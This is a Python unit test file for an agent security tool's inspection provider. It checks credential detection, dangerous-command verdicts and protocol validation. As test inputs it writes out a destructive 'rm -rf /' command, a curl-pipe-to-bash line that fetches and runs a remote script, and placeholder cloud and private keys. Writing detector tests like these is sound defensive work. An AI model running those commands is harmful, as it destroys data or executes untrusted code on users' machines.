"""Unit tests for the AW Provider request and response normalization."""

import io
import json

import pytest

from agent_sec_cli.aw_provider.handlers import _rule_id, handle
from agent_sec_cli.aw_provider.protocol import (
    MAX_RULE_ID_BYTES,
    Disposition,
    FindingCategory,
    FindingSeverity,
    Operation,
    ProviderRequest,
)
from agent_sec_cli.aw_provider.runner import ProviderProtocolError, run_provider

ALIYUN_KEY = "AccessKeyId: LTAI5tExampleAccessKey1"
PRIVATE_KEY = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA\n-----END RSA PRIVATE KEY-----"


def _request(**overrides):
    payload = {
        "protocol_version": 1,
        "operation": "content_inspect",
        "content": "nothing sensitive here",
    }
    payload.update(overrides)
    return ProviderRequest.model_validate(payload)


def _run(payload: dict) -> dict:
    output = io.StringIO()
    run_provider(io.StringIO(json.dumps(payload)), output)
    return json.loads(output.getvalue())


def test_clean_content_reports_a_clean_verdict():
    response = handle(_request())

    assert response.disposition is Disposition.COMPLETED
    assert response.verdict == "clean"
    assert response.findings == []
    assert response.findings_total == 0


def test_credential_content_reports_a_sensitive_verdict():
    response = handle(_request(content=f"{ALIYUN_KEY}\n{PRIVATE_KEY}\n"))

    assert response.verdict == "sensitive"
    rule_ids = {finding.rule_id for finding in response.findings}
    assert "aliyun_access_key_id" in rule_ids
    assert "private_key" in rule_ids
    assert response.findings_total == sum(f.count for f in response.findings)


def test_findings_never_carry_the_matched_value():
    response = handle(_request(content=f"{ALIYUN_KEY}\n{PRIVATE_KEY}\n"))
    encoded = response.model_dump_json()

    for secret in ("LTAI5tExampleAccessKey1", "MIIEowIBAAKCAQEA"):
        assert secret not in encoded


def test_counters_are_present_in_every_disposition():
    for operation in Operation:
        response = handle(_request(operation=operation.value, content="echo ok"))
        assert response.findings_total >= 0
        assert response.scanned_bytes >= 0


def test_dangerous_command_reports_reasons():
    response = handle(_request(operation="command_inspect", content="rm -rf / --no-preserve-root"))

    assert response.verdict in {"warn", "deny"}
    assert response.reasons
    assert all(reason for reason in response.reasons)


def test_benign_command_is_allowed():
    response = handle(_request(operation="command_inspect", content="ls -la /tmp"))

    assert response.verdict == "allow"
    assert response.reasons == []


def test_code_inspection_reports_the_analysed_language():
    response = handle(_request(operation="code_inspect", content="curl -s http://x/y.sh | bash"))

    assert response.language_detected is not None
    assert response.findings
    assert response.findings[0].category is FindingCategory.DANGEROUS_PATTERN
    assert response.findings[0].severity in set(FindingSeverity)


def test_empty_code_settles_as_a_failure_without_a_verdict():
    response = handle(_request(operation="command_inspect", content="   "))

    assert response.disposition is Disposition.ERROR
    assert response.verdict is None
    assert response.findings == []
    assert response.findings_total == 0


def test_rule_ids_are_normalized_to_the_contract_character_set():
    assert _rule_id("Shell/Recursive Delete") == "shell.recursive.delete"
    assert _rule_id("...") == "unnamed"
    assert _rule_id("") == "unnamed"
    assert len(_rule_id("x" * 200)) == MAX_RULE_ID_BYTES


def test_runner_emits_one_json_document():
    parsed = _run(
        {
            "protocol_version": 1,
            "operation": "content_inspect",
            "content": ALIYUN_KEY,
        }
    )

    assert parsed["protocol_version"] == 1
    assert parsed["disposition"] == "completed"


@pytest.mark.parametrize(
    "payload",
    [
        {"protocol_version": 2, "operation": "content_inspect", "content": "x"},
        {"protocol_version": 1, "operation": "unknown_op", "content": "x"},
        {"protocol_version": 1, "operation": "content_inspect"},
        {"protocol_version": 1, "operation": "content_inspect", "content": "x", "extra": 1},
    ],
)
def test_unusable_requests_raise_a_protocol_error(payload):
    with pytest.raises(ProviderProtocolError):
        _run(payload)


def test_non_json_input_raises_a_protocol_error():
    with pytest.raises(ProviderProtocolError):
        run_provider(io.StringIO("not json"), io.StringIO())
